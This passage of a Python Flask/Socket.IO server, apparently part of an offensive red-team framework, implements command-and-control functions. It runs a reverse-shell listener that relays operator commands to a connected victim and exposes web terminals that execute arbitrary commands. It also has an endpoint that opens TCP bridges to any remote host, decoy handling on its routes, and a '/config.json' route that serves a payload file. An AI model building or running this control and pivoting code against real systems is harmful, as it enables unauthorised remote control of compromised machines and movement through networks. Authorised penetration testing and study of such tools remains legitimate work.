    """Maneja el redimensionamiento de la terminal"""
    if app.config["fd"]:
        logger.info(f"Redimensionando terminal a {data['rows']}x{data['cols']}")
        set_winsize(app.config["fd"], data["rows"], data["cols"])

@socketio.on("connect", namespace="/pty")
def connect():
    """Maneja nueva conexión de cliente"""
    logger.info("Nuevo cliente conectado")
    
    if app.config["child_pid"]:
        return  # Ya hay una sesión activa

    try:
        # Crear proceso hijo con PTY
        (child_pid, fd) = pty.fork()
        
        if child_pid == 0:
            # Proceso hijo - ejecuta LazyOwnShell
            subprocess.run([
                "python3", "lazyown.py"
            ], check=True)
        else:
            # Proceso padre - configuración inicial
            app.config["fd"] = fd
            app.config["child_pid"] = child_pid
            
            # Tamaño inicial de la terminal
            set_winsize(fd, 80, 140)
            
            # Iniciar tarea de lectura de salida
            socketio.start_background_task(read_and_forward_pty_output)
            logger.info(f"Proceso hijo iniciado con PID {child_pid}")
            
    except Exception as e:
        logger.error(f"Error iniciando shell: {e}")

@socketio.on('input')
def handle_input(data):
    command = data.get('value')
    if not command:
        return
    
    print(f'[CMD] Received: {command}')
    
    # Inyectar entrada al shell (simula input())
    shell.stdin.write(command + '\n')
    command_out = shell.one_cmd(command)
    shell.stdin.seek(0)
    
    # Procesar salida acumulada
    output = shell.stdout.getvalue()
    shell.stdout.truncate(0)
    shell.stdout.seek(0)
    
    emit('output', command_out + '$ ')

@socketio.on('command', namespace='/listener')
def handle_command(msg):
    print('Received command: ' + msg)
    try:
     
        reverse_shell_socket.sendall((msg + "\n").encode())
    except Exception as e:
        emit('response', {'output': str(e)}, namespace='/listener')

# Ruta nueva
@app.route('/terminal')
def terminal():
    return render_template('terminal.html')

# WebSocket nuevo espacio: /terminal
@socketio.on('connect', namespace='/terminal')
def handle_connect():
    logger.info("Cliente conectado a /terminal")


@socketio.on('disconnect', namespace='/terminal')
def handle_disconnect():
    logger.info("Cliente desconectado de /terminal")

@socketio.on('input', namespace='/terminal')
def handle_input(data):
    command = data.get("command")
    client_id = data.get("client_id")
    if command and client_id:
        output = execute_command(command)
        socketio.emit('output', {
            'client_id': client_id,
            'output': output
        }, namespace='/terminal')

@socketio.on('command', namespace='/terminal')
def handle_command(data):
    cmd = data.get('cmd')
    if not cmd:
        return
    print(f"Ejecutando comando: {cmd}")
    output = execute_command(cmd)
    emit('response', {'output': output})
    
@socketio.on('resize', namespace='/terminal')
def handle_resize(data):
    if app.config["fd"]:
        set_winsize(app.config["fd"], data["rows"], data["cols"])

def start_reverse_shell():
    global reverse_shell_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', reverse_shell_port))
    server_socket.listen(1)
    print(f"Listening for reverse shell on port {reverse_shell_port}...")

    reverse_shell_socket, addr = server_socket.accept()
    print(f"Connection from {addr}")
    while True:
        data = reverse_shell_socket.recv(1024)
        if not data:
            break
        socketio.emit('response', {'output': data.decode()}, namespace='/listener')

@app.route('/start_bridge', methods=['POST'])
@requires_auth
def start_bridge():
    """Start a TCP bridge to a specified remote host and port."""
    response = decoy()
    if response:
        return response    
    local_port = int(request.form['local_port'])
    remote_host = request.form['remote_host']
    remote_port = int(request.form['remote_port'])
    bridge_thread = threading.Thread(target=tcp_bridge, args=(local_port, remote_host, remote_port))
    bridge_thread.start()

    return jsonify({"status": "success", "message": f"TCP bridge started on port {local_port} to {remote_host}:{remote_port}"}), 200

@app.errorhandler(404)
def page_not_found(e):
    response = decoy()
    if response:
        return response    
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_server_error(e):
    response = decoy()
    if response:
        return response    
    return render_template('500.html'), 500

@app.route('/config.json')
def get_config():
    """
    Lee el archivo payload.json, lo manipula y lo expone como /config.json.
    """
    try:
        with open('payload.json', 'r') as f:
            payload = json.load(f)
    except FileNotFoundError:
        return jsonify({"error": "payload.json not found"}), 404
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON format in payload.json"}), 500

    sanitized_payload = sanitize_json(payload)
    final_payload = add_dynamic_data(sanitized_payload)

    return jsonify(final_payload)

thread = Thread(target=run_shell)
thread.daemon = True
thread.start()

if __name__ == '__main__':
    path = os.getcwd().replace("modules", "sessions" )
    uploads = f"{path}/uploads"
    dns_thread = threading.Thread(target=start_dns_server, daemon=True)
    dns_thread.start()
    watching_thread = threading.Thread(target=start_watching, daemon=True)
    watching_thread.start()
    
    if not os.path.exists(uploads):
        os.makedirs(uploads)

    if ENV == 'PROD':
        threading.Thread(target=start_reverse_shell).start()
        app.run(host='0.0.0.0', port=lport, ssl_context=('cert.pem', 'key.pem'))
        socketio.run(app, host='0.0.0.0', port=5000, certfile='cert.pem', keyfile='key.pem')
    else:
        app.run(host='0.0.0.0', port=lport )

    
